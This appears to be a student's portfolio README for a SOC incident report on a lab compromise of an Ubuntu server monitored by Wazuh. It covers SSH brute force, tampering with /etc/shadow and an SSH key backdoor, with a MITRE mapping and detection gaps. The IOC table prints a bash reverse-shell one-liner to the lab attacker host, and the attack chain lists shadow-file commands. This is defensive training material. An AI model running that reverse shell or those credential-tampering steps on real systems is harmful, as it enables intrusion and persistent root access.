# SOC L1 Incident Response Report — Linux Server Compromise

**Incident ID:** IR-2026-0616-001  
**Environment:** Wazuh SOC Detection Lab  
**Date:** June 16, 2026  
**Analyst:** Sujal Adhikari — Final Year Cybersecurity Student  

---

## Overview

Professional **post-incident SOC L1 report** documenting a multi-stage intrusion on an Ubuntu server monitored by Wazuh SIEM. The attack chain includes SSH brute-force, privilege escalation, credential dumping, root persistence, and detection gap analysis.

> This repository contains the full incident response report and supporting evidence for portfolio use.

---

## Scope

| Asset | Details |
|---|---|
| **Target** | ubuntu-server (192.168.71.104) — Ubuntu 26.04 LTS |
| **Management** | Wazuh Manager (192.168.71.103) |
| **Attacker** | Kali Linux (192.168.71.110) — internal pivot |
| **Compromised Account** | `jhon` (uid=1001) → `root` |
| **Duration** | ~55 minutes (06:54 – 07:49 UTC) |

---

## Attack Chain Summary

```
[Kali 192.168.71.110]
        │
        │  SSH Brute-Force (116 attempts)
        ▼
[ubuntu-server 192.168.71.104]  ────  user: jhon
        │
        │  sudo cat /etc/shadow
        │  sudo cp /etc/shadow /tmp/shadow
        │  sudo nano /tmp/shadow  (root hash replaced)
        │  sudo chmod 600 /tmp/shadow
        ▼
       root access gained
        │
        │  SSH key backdoor → /root/.ssh/authorized_keys
        │  Password re-enabled in sshd_config
        ▼
   Persistent root access established
```

---

## MITRE ATT&CK Mapping

| Step | Tactic | Technique | ID |
|---|---|---|---|
| 1 | Initial Access | Brute Force: SSH | T1110.001 |
| 2 | Initial Access | Valid Accounts | T1078 |
| 3 | Execution | Unix Shell | T1059.004 |
| 4 | Privilege Escalation | Sudo and Sudo Caching | T1548.003 |
| 5 | Credential Access | OS Credential Dumping: /etc/shadow | T1003.002 |
| 6 | Impact | Stored Data Manipulation | T1565.001 |
| 7 | Persistence | SSH Authorized Keys | T1098.004 |
| 8 | Persistence | Modify Authentication Process: SSH Config | T1556.004 |

---

## Key IOCs

| Type | Value |
|---|---|
| **Attacker IP** | `192.168.71.110` |
| **Compromised User** | `jhon` |
| **New Root Password** | `admin` (SHA-512 set in `/etc/shadow`) |
| **Persistence File** | `/root/.ssh/authorized_keys` |
| **Staging File** | `/tmp/shadow` |
| **Config Change** | `/etc/ssh/sshd_config` — `PasswordAuthentication yes` |
| **Reverse Shell** | `bash -i >& /dev/tcp/192.168.71.110/4444 0>&1` |

---

## Detection Gaps Identified

These post-exploitation activities were **NOT auto-detected** by Wazuh:

- `bash` reverse shell via I/O redirection
- `/root/.ssh/authorized_keys` creation (FIM not watching `/root/.ssh/`)
- `/etc/shadow` modification (added to FIM after attack)

---

## Repository Contents

| File | Description |
|---|---|
| `Incident_Response_Report_v2.docx` | Full SOC L1 post-incident report (Word) |
| `Incident_Response_Report_Enhanced.md` | Enhanced Markdown version with attack breakdown |
| `build_report.py` | Python script used to generate the Word report |
| `screenshots/` | Evidence captures from Wazuh dashboard |

---

## Skills Demonstrated

- SOC L1 incident triage and alert analysis
- Wazuh SIEM querying (Discover DQL, rule interpretation)
- MITRE ATT&CK mapping and IOC extraction
- Linux forensic artifact analysis (`/etc/shadow`, `sshd_config`, `authorized_keys`)
- Privilege escalation and persistence technique identification
- Technical report writing for non-technical stakeholders
- Detection gap analysis and remediation planning

---

## Tools & Technologies

- **SIEM:** Wazuh Manager v4.x
- **Attacker VM:** Kali Linux
- **Target OS:** Ubuntu 26.04 LTS
- **Report Generation:** python-docx, Markdown

---

## Report Structure

1. Executive Summary  
2. Incident Overview  
3. Timeline of Events (UTC + Nepal local)  
4. MITRE ATT&CK Mapping  
5. Technical Attack Breakdown  
6. IOCs  
7. Evidence & Screenshots (8 placeholders)  
8. Detection Gaps  
9. Root Cause Analysis  
10. Remediation (P0 / P1 / P2)  
11. Escalation Notes  
12. Conclusion & Appendices

---

## Notes

- All evidence was collected from a **controlled lab environment**.
- IPs and hostnames reflect an isolated internal lab (192.168.71.0/24).
- No production systems were affected.
- Report written in accessible technical language suitable for both engineering and management stakeholders.

---

*Built as part of a SOC L1 job preparation portfolio.*
